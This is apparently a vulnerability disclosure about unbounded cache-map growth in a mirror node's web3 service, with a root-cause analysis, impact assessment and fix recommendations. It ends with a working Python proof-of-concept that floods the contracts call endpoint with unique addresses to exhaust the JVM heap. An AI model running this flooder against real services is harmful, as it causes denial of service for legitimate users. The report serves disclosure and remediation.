### Title
Unbounded `CaffeineCacheManager` Internal Map Growth via Unique `contractId` Flooding in `findStorageBatch`

### Summary
`ContractStateServiceImpl.findStorageBatch()` calls `cacheManagerSlotsPerContract.getCache(contractId.toString())` for every unique `contractId` seen. The `cacheManagerSlotsPerContract` bean is a `CaffeineCacheManager` configured without `setCacheNames()`, placing it in dynamic mode where each `getCache(name)` call creates a new `CaffeineCache` instance and stores it permanently in an internal unbounded `ConcurrentHashMap<String, Cache>`. The outer `contractSlotsCache` (bounded at 3000 entries) evicts entries over time, but the inner manager's map never removes them, creating a permanent memory leak. An unprivileged attacker can exploit the public `/api/v1/contracts/call` endpoint to drive unbounded heap growth until OOM.

### Finding Description

**Exact code path:**

`EvmConfiguration.java` lines 107–112 — the `slotsPerContract` `CaffeineCacheManager` is created with no `setCacheNames()` call, enabling dynamic (unbounded) cache registration:

```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    return caffeineCacheManager;  // NO setCacheNames() → dynamic mode
}
```

`ContractStateServiceImpl.java` line 87 — on every cache miss for a new `contractId`, `getCache()` is called on this dynamic manager:

```java
final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
    contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**Root cause:** Spring's `CaffeineCacheManager.getCache(name)` in dynamic mode stores the newly created `CaffeineCache` in an internal `ConcurrentHashMap<String, Cache> cacheMap`. This map has no eviction, no size bound, and no TTL. The outer `contractSlotsCache` (configured `maximumSize=3000`) evicts entries after 5 minutes of inactivity, but eviction from the outer cache does **not** remove the corresponding entry from `cacheManagerSlotsPerContract`'s internal `cacheMap`. Every unique `contractId.toString()` ever passed to `findStorageBatch` accumulates permanently in that map.

**Exploit flow:**
1. Attacker sends `POST /api/v1/contracts/call` requests, each targeting a different `to` address (different `contractId`).
2. Each request reaches `findStorage` → `findStorageBatch` → `cacheManagerSlotsPerContract.getCache(contractId.toString())`.
3. A new `CaffeineCache` (backed by a Caffeine cache with `maximumSize=1500`) is created and inserted into the manager's internal map.
4. After 3000 unique contractIds, the outer `contractSlotsCache` starts evicting, but the inner map keeps growing.
5. Each `CaffeineCache` instance with `maximumSize=1500` carries significant fixed overhead (frequency sketch, eviction arrays, etc.) even when empty — on the order of tens of KB per instance.
6. The map grows without bound until heap exhaustion.

**Why existing checks fail:**

The global rate limiter (`requestsPerSecond=500`, `ThrottleManagerImpl.java` lines 38–42) is a single shared bucket — not per-IP. An attacker consuming all 500 req/s generates 500 new `CaffeineCache` instances per second. After the outer cache fills (3000 entries, ~6 seconds), every subsequent request adds a net-new permanent entry to the inner map. After one hour: ~1.8M leaked `CaffeineCache` objects. There is no per-IP throttle, no validation that `contractId` refers to an existing contract before entering `findStorageBatch`, and no cleanup path for the inner manager's map.

### Impact Explanation

The `cacheManagerSlotsPerContract` internal map grows without bound, holding strong references to `CaffeineCache` objects that cannot be garbage collected. At scale this causes severe GC pressure (frequent full GCs stalling all threads) and ultimately `OutOfMemoryError`, crashing the web3 service. This makes the JSON-RPC API (`eth_call`, `eth_estimateGas`) completely unavailable. Because the throttle is global and not per-IP, the attacker simultaneously starves legitimate users of their 500 req/s quota while filling the heap.

### Likelihood Explanation

The attack requires no authentication, no on-chain funds, and no special knowledge beyond the public JSON-RPC API. The attacker only needs to cycle through different `to` addresses in `eth_call` requests. Hedera entity IDs are sequential integers, making enumeration trivial. The attack is repeatable and persistent — the leaked objects are never reclaimed. A single attacker with a modest HTTP client can sustain 500 req/s indefinitely.

### Recommendation

1. **Fix the root cause:** In `cacheManagerSlotsPerContract()`, call `setCacheNames()` with a pre-registered fixed set of names, or replace the two-level cache design with a single bounded cache keyed by `(contractId, slotKey)`.
2. **Alternatively:** Replace `cacheManagerSlotsPerContract.getCache(contractId.toString())` with a direct `Caffeine.newBuilder()...build()` call and store the resulting cache as the value in the outer `contractSlotsCache`, using a `RemovalListener` on the outer cache to explicitly discard the inner cache object when evicted.
3. **Defense in depth:** Add per-IP rate limiting at the ingress/load-balancer layer so a single source cannot consume the full global throttle budget.

### Proof of Concept

```python
import requests, threading

URL = "http://<mirror-node>/api/v1/contracts/call"
HEADERS = {"Content-Type": "application/json"}

def flood(start, count):
    for i in range(start, start + count):
        # Each request uses a different contract address (unique contractId)
        contract_addr = "0x" + hex(i)[2:].zfill(40)
        payload = {
            "to": contract_addr,
            "data": "0x",
            "gas": 21000,
            "estimate": False,
            "block": "latest"
        }
        try:
            requests.post(URL, json=payload, headers=HEADERS, timeout=5)
        except Exception:
            pass

# Launch threads to sustain ~500 req/s with unique contractIds
threads = [threading.Thread(target=flood, args=(i * 10000, 10000)) for i in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
# After ~6 seconds the outer contractSlotsCache (maximumSize=3000) is full.
# The cacheManagerSlotsPerContract internal map continues growing unboundedly.
# Monitor heap via JMX: ConcurrentHashMap inside CaffeineCacheManager grows without bound.
```

Expected result: JVM heap grows monotonically; GC logs show increasing full-GC frequency; eventually `java.lang.OutOfMemoryError: Java heap space` in the web3 service process.